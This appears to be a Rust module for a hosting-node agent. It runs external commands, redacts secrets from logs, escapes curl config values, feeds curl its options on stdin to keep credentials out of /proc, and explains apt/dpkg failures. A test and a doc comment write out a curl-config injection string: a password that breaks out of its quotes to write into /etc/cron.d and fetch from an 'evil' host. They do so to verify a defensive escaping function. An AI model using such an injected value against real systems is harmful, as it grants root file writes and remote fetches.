//! Typed `Command::new(..).arg(..)` runner that captures stderr on failure.

use crate::AdapterError;
use tokio::process::Command;
use tracing::debug;

/// Redact args that may carry a secret before they reach a log line or an error
/// string.
///
/// SECURITY (sec-findings #11): args like `Authorization: Bearer <token>`, an
/// `--header` value, or a `?token=…`/`--password` argument must never be logged
/// (`debug!(?args)`) or embedded in `AdapterError::Command`'s `cmd` field, where
/// they'd leak to log files / error responses. We mask any arg whose lowercased
/// text mentions a known secret marker. The actual command still runs with the
/// real args — only the *displayed* copy is redacted.
fn redact_args(args: &[&str]) -> Vec<String> {
    const MARKERS: [&str; 5] = ["authorization", "bearer", "token", "password", "secret"];
    args.iter()
        .map(|a| {
            let lc = a.to_ascii_lowercase();
            if MARKERS.iter().any(|m| lc.contains(m)) {
                "<redacted>".to_string()
            } else {
                (*a).to_string()
            }
        })
        .collect()
}

/// Run a command and require zero exit. Returns stdout (UTF-8 lossy).
/// On failure produces an `AdapterError::Command` carrying the last
/// 4 KiB of stderr.
pub async fn run(program: &str, args: &[&str]) -> Result<String, AdapterError> {
    debug!(program, args = ?redact_args(args), "exec");
    let out = Command::new(program).args(args).output().await?;
    if !out.status.success() {
        let code = out.status.code().unwrap_or(-1);
        let stderr = String::from_utf8_lossy(&out.stderr);
        let tail: String = stderr
            .chars()
            .rev()
            .take(4096)
            .collect::<String>()
            .chars()
            .rev()
            .collect();
        return Err(AdapterError::Command {
            cmd: format!("{program} {}", redact_args(args).join(" ")),
            code,
            stderr_tail: tail,
        });
    }
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}

/// Like [`run`], but on failure the error tail carries **stdout + stderr**
/// combined. Some tools — notably `apt-get`/`dpkg` — print the decisive
/// diagnostic ("dpkg: error processing package … post-installation script
/// subprocess returned error exit status N") to STDOUT and only the generic
/// "E: Sub-process … returned an error code" to stderr, so a stderr-only
/// capture throws away the actual cause. Returns stdout on success.
pub async fn run_capturing_all(program: &str, args: &[&str]) -> Result<String, AdapterError> {
    debug!(program, args = ?redact_args(args), "exec (combined capture)");
    let out = Command::new(program).args(args).output().await?;
    if !out.status.success() {
        let code = out.status.code().unwrap_or(-1);
        let mut combined = String::from_utf8_lossy(&out.stdout).into_owned();
        if !combined.is_empty() && !combined.ends_with('\n') {
            combined.push('\n');
        }
        combined.push_str(&String::from_utf8_lossy(&out.stderr));
        let tail: String = combined
            .chars()
            .rev()
            .take(4096)
            .collect::<String>()
            .chars()
            .rev()
            .collect();
        return Err(AdapterError::Command {
            cmd: format!("{program} {}", redact_args(args).join(" ")),
            code,
            stderr_tail: tail,
        });
    }
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}

/// Run a command and feed stdin from the provided bytes.
pub async fn run_with_stdin(
    program: &str,
    args: &[&str],
    stdin: &[u8],
) -> Result<String, AdapterError> {
    use tokio::io::AsyncWriteExt;
    debug!(program, args = ?redact_args(args), stdin_bytes = stdin.len(), "exec with stdin");
    let mut child = Command::new(program)
        .args(args)
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()?;
    if let Some(mut sin) = child.stdin.take() {
        sin.write_all(stdin).await?;
        sin.shutdown().await?;
    }
    let out = child.wait_with_output().await?;
    if !out.status.success() {
        let code = out.status.code().unwrap_or(-1);
        let stderr = String::from_utf8_lossy(&out.stderr);
        let tail: String = stderr
            .chars()
            .rev()
            .take(4096)
            .collect::<String>()
            .chars()
            .rev()
            .collect();
        return Err(AdapterError::Command {
            cmd: format!("{program} {}", redact_args(args).join(" ")),
            code,
            stderr_tail: tail,
        });
    }
    Ok(String::from_utf8_lossy(&out.stdout).into_owned())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn echo_stdout() {
        let out = run("/bin/echo", &["hello"]).await.expect("echo");
        assert_eq!(out.trim_end(), "hello");
    }

    #[tokio::test]
    async fn nonzero_exit_is_error() {
        let err = run("/usr/bin/false", &[]).await.unwrap_err();
        match err {
            AdapterError::Command { code, .. } => assert_ne!(code, 0),
            other => panic!("wrong: {other:?}"),
        }
    }

    #[tokio::test]
    async fn captures_stderr_tail() {
        // `ls` of a missing file writes to stderr and exits non-zero.
        let err = run("/bin/ls", &["/this/does/not/exist/lm-test"])
            .await
            .unwrap_err();
        match err {
            AdapterError::Command { stderr_tail, .. } => {
                assert!(!stderr_tail.is_empty());
            }
            other => panic!("wrong: {other:?}"),
        }
    }

    #[tokio::test]
    async fn run_capturing_all_includes_stdout_in_error() {
        // `ls` of one real + one missing path lists the real one to STDOUT,
        // writes the error to stderr, and exits non-zero — so the combined
        // tail must contain the stdout portion (which plain `run` would drop).
        let err = run_capturing_all("/bin/ls", &["/etc/hosts", "/nonexistent-lm-xyz-42"])
            .await
            .unwrap_err();
        match err {
            AdapterError::Command { stderr_tail, .. } => {
                assert!(
                    stderr_tail.contains("hosts"),
                    "combined tail must include stdout: {stderr_tail}"
                );
            }
            other => panic!("wrong: {other:?}"),
        }
    }

    #[test]
    fn redacts_secret_bearing_args() {
        let args = [
            "-H",
            "Authorization: Bearer cf-abc123",
            "https://api/x?token=zzz",
            "--data",
            "{\"type\":\"TXT\"}",
        ];
        let red = redact_args(&args);
        assert_eq!(red[0], "-H");
        assert_eq!(red[1], "<redacted>", "Authorization header must be masked");
        assert_eq!(red[2], "<redacted>", "token query arg must be masked");
        assert_eq!(red[3], "--data");
        assert_eq!(red[4], "{\"type\":\"TXT\"}", "non-secret args pass through");
        assert!(
            !red.join(" ").contains("cf-abc123"),
            "the secret must not survive redaction"
        );
    }

    #[tokio::test]
    async fn stdin_is_forwarded() {
        let out = run_with_stdin("/usr/bin/wc", &["-c"], b"hello")
            .await
            .expect("wc");
        // wc -c prints "<bytes>\n" or similar
        assert!(out.contains('5'), "wc output: {out:?}");
    }
}

/// Translate an apt/dpkg failure into one sentence naming the HOST-level
/// cause, or `None` when the output shows nothing recognisable.
///
/// Package-manager failures arrive as kilobytes of per-archive dpkg noise
/// in which the decisive line appears dozens of times and the actual
/// cause is a property of the machine, not of the packages. An operator
/// reading "dpkg: error processing archive ... (--unpack)" eleven times
/// reasonably concludes the software is broken; the real message was
/// `Read-only file system`, which no amount of retrying will fix.
///
/// Ordered by how completely each cause explains the failure: a
/// read-only or full filesystem makes every later symptom meaningless,
/// so it is matched first.
/// Escape a value for a curl config-file directive.
///
/// curl reads `name = "value"` and honours backslash escapes inside the
/// quotes. Without escaping, a password containing a quote ends the value
/// early and the rest of it is parsed as MORE DIRECTIVES — a newline plus
/// `output = "/etc/cron.d/x"` in a backup password is a file write as root.
/// The value is attacker-influenced wherever an operator pastes a credential
/// from somewhere else, so it is escaped rather than trusted.
pub fn curl_config_quote(value: &str) -> String {
    let mut out = String::with_capacity(value.len() + 2);
    for c in value.chars() {
        match c {
            '\\' => out.push_str("\\\\"),
            '"' => out.push_str("\\\""),
            '\n' => out.push_str("\\n"),
            '\r' => out.push_str("\\r"),
            '\t' => out.push_str("\\t"),
            other => out.push(other),
        }
    }
    out
}

/// Run curl with its options on STDIN instead of argv.
///
/// `/proc/<pid>/cmdline` is world-readable, so any local user — on this
/// product that means any tenant with shell, FTP or PHP on the node — can
/// read another process's arguments. A credential there is a credential
/// published to every tenant for as long as the process lives, and an upload
/// of a multi-hundred-megabyte backup lives for minutes. Nothing about the
/// argument being "short-lived" helps: reading /proc in a loop is trivial.
///
/// `config` is a curl config file: one `name = "value"` per line. Build every
/// interpolated value with [`curl_config_quote`].
pub async fn curl_with_config(config: &str) -> Result<String, AdapterError> {
    let (stdout, stderr, code) = curl_with_config_capture(config).await?;
    if code != 0 {
        return Err(AdapterError::Command {
            // NOT the config: it holds the credential this whole function
            // exists to keep out of places people can read.
            cmd: "curl --config - (options withheld)".to_string(),
            code,
            stderr_tail: stderr,
        });
    }
    Ok(stdout)
}

/// [`curl_with_config`] without treating a non-zero exit as an error.
///
/// Some probes read curl's own report (`-w "%{http_code}"`) and need the
/// output of a run that curl considers a failure — an FTP 530 is the ANSWER
/// there, not a transport problem. Returns `(stdout, stderr tail, exit code)`.
pub async fn curl_with_config_capture(config: &str) -> Result<(String, String, i32), AdapterError> {
    use tokio::io::AsyncWriteExt;
    debug!("exec curl (options on stdin)");
    let mut child = Command::new("/usr/bin/curl")
        .arg("--config")
        .arg("-")
        .stdin(std::process::Stdio::piped())
        .stdout(std::process::Stdio::piped())
        .stderr(std::process::Stdio::piped())
        .spawn()
        .map_err(|e| AdapterError::Other(format!("spawn curl: {e}")))?;
    if let Some(mut si) = child.stdin.take() {
        si.write_all(config.as_bytes())
            .await
            .map_err(|e| AdapterError::Other(format!("write curl config: {e}")))?;
        si.shutdown()
            .await
            .map_err(|e| AdapterError::Other(format!("close curl stdin: {e}")))?;
    }
    let out = child
        .wait_with_output()
        .await
        .map_err(|e| AdapterError::Other(format!("wait curl: {e}")))?;
    let stderr = String::from_utf8_lossy(&out.stderr);
    let tail: String = stderr
        .chars()
        .rev()
        .take(4096)
        .collect::<String>()
        .chars()
        .rev()
        .collect();
    Ok((
        String::from_utf8_lossy(&out.stdout).into_owned(),
        tail,
        out.status.code().unwrap_or(-1),
    ))
}

#[cfg(test)]
mod curl_config_tests {
    use super::curl_config_quote;

    /// An ordinary credential passes through untouched.
    #[test]
    fn a_plain_value_is_unchanged() {
        assert_eq!(curl_config_quote("s3cr3t-p4ss"), "s3cr3t-p4ss");
        assert_eq!(curl_config_quote("user@example.cz"), "user@example.cz");
    }

    /// The injection this exists to stop: a quote would close the value and
    /// everything after it would be read as further curl directives.
    #[test]
    fn a_quote_cannot_end_the_value() {
        let evil = "pw\"\noutput = \"/etc/cron.d/pwned\"\nurl = \"http://evil\"";
        let quoted = curl_config_quote(evil);
        assert!(!quoted.contains('\n'), "a raw newline survived: {quoted}");
        // Every quote in the output is preceded by a backslash.
        for (i, c) in quoted.char_indices() {
            if c == '"' {
                assert!(
                    i > 0 && quoted.as_bytes()[i - 1] == b'\\',
                    "an unescaped quote survived: {quoted}"
                );
            }
        }
    }

    #[test]
    fn a_backslash_is_doubled_so_it_cannot_escape_the_closing_quote() {
        assert_eq!(curl_config_quote("a\\"), "a\\\\");
        assert_eq!(curl_config_quote("a\\\"b"), "a\\\\\\\"b");
    }
}

pub fn explain_apt_failure(output: &str) -> Option<&'static str> {
    // Case-insensitive on purpose — dpkg and apt disagree about capitals
    // across versions and locales.
    let o = output.to_ascii_lowercase();
    if o.contains("read-only file system") {
        return Some(
            "a filesystem the package needs to write to is READ-ONLY. Check the SANDBOX \
             first, not the disk: hyperion-agent runs with systemd's ProtectSystem=, which \
             mounts /usr read-only for that service alone — so `mount` in your own shell \
             shows / as rw while apt, running under the agent, cannot write a thing. \
             Confirm with `systemctl show hyperion-agent -p ProtectSystem -p ReadWritePaths`; \
             the unit needs ReadWritePaths=/usr (shipped since v0.15.1 — run update.sh). \
             Only if the sandbox is not the cause is this a real disk fault, which \
             `mount | grep ' / '` (looking for `ro,`) and `dmesg -T | grep -i 'i/o error'` \
             will show, and which needs fsck from rescue mode.",
        );
    }
    if o.contains("no space left on device") {
        return Some(
            "this server has run out of disk space, so the package could not be unpacked. \
             Check `df -h` and free some room, then try again. Note that a full disk can \
             also leave apt half-configured; `dpkg --configure -a` cleans that up.",
        );
    }
    if o.contains("could not get lock") || o.contains("dpkg frontend lock") {
        return Some(
            "another package operation is already running on this server (apt, unattended-\
             upgrades, or a previous attempt that has not finished). Wait for it to end and \
             try again — running two at once would corrupt the package database.",
        );
    }
    if o.contains("temporary failure resolving") || o.contains("could not resolve host") {
        return Some(
            "this server cannot resolve the package repository's hostname, so nothing could \
             be downloaded. Check DNS on the node (`resolvectl status`, /etc/resolv.conf) \
             and that outbound HTTPS is allowed.",
        );
    }
    if o.contains("no_pubkey") || o.contains("signatures were invalid") {
        return Some(
            "a package repository's signing key is missing or expired, so apt refused its \
             packages. Re-import the repository's key, then run `apt-get update`.",
        );
    }
    if o.contains("held broken packages") || o.contains("unmet dependencies") {
        return Some(
            "apt could not satisfy the dependencies. This usually means a third-party \
             repository is configured for the WRONG Debian release, so it offers packages \
             built against libraries this system does not have. Check the suites in \
             /etc/apt/sources.list.d/ against `. /etc/os-release; echo $VERSION_CODENAME`.",
        );
    }
    None
}

#[cfg(test)]
mod apt_explain_tests {
    use super::explain_apt_failure;

    /// Built from the real dpkg output that sent an operator chasing a
    /// DKIM bug for an hour: eleven "error processing archive" lines
    /// around one sentence that actually mattered.
    #[test]
    fn a_read_only_root_is_reported_ahead_of_the_dpkg_noise() {
        let raw = "Unpacking librbl1:amd64 (2.11.0~beta2-9.1+b1) ...\n\
                   dpkg: error processing archive /tmp/apt-dpkg-install-f3jn1P/06-librbl1.deb (--unpack):\n\
                   unable to create '/usr/lib/x86_64-linux-gnu/librbl.so.1.0.0.dpkg-new': Read-only file system\n\
                   E: Sub-process /usr/bin/dpkg returned an error code (1)\n";
        let msg = explain_apt_failure(raw).expect("must recognise a read-only root");
        assert!(msg.contains("READ-ONLY"), "{msg}");
        // The sandbox must be named BEFORE the disk. Getting this order
        // wrong sent an operator to fsck a healthy volume: their own
        // shell showed / as rw the whole time, because ProtectSystem
        // applies only inside the agent's mount namespace.
        let sandbox = msg.find("ProtectSystem").expect("must name the sandbox");
        let disk = msg
            .find("fsck")
            .expect("must still mention a real disk fault");
        assert!(sandbox < disk, "sandbox must be diagnosed first: {msg}");
    }

    /// A full disk and a read-only mount look similar in a log and need
    /// different fixes, so they must not collapse into one message.
    #[test]
    fn each_host_level_cause_gets_its_own_answer() {
        let cases = [
            (
                "dpkg: unrecoverable fatal error: No space left on device",
                "disk space",
            ),
            (
                "E: Could not get lock /var/lib/dpkg/lock-frontend",
                "already running",
            ),
            ("Temporary failure resolving 'deb.debian.org'", "resolve"),
            ("W: GPG error: ... NO_PUBKEY 1234ABCD", "signing key"),
            (
                "E: Unable to correct problems, you have held broken packages",
                "dependencies",
            ),
        ];
        for (raw, needle) in cases {
            let msg = explain_apt_failure(raw).unwrap_or_else(|| panic!("unmatched: {raw}"));
            assert!(msg.contains(needle), "{raw} -> {msg}");
        }
        // Matching is case-insensitive: dpkg and apt differ across versions.
        assert!(explain_apt_failure("READ-ONLY FILE SYSTEM").is_some());
    }

    /// An unrecognised failure must return None so the caller shows the
    /// real output rather than a confident guess about the wrong thing.
    #[test]
    fn an_unknown_failure_is_not_explained_away() {
        assert!(
            explain_apt_failure("E: Package 'nosuchpkg' has no installation candidate").is_none()
        );
        assert!(explain_apt_failure("").is_none());
    }
}
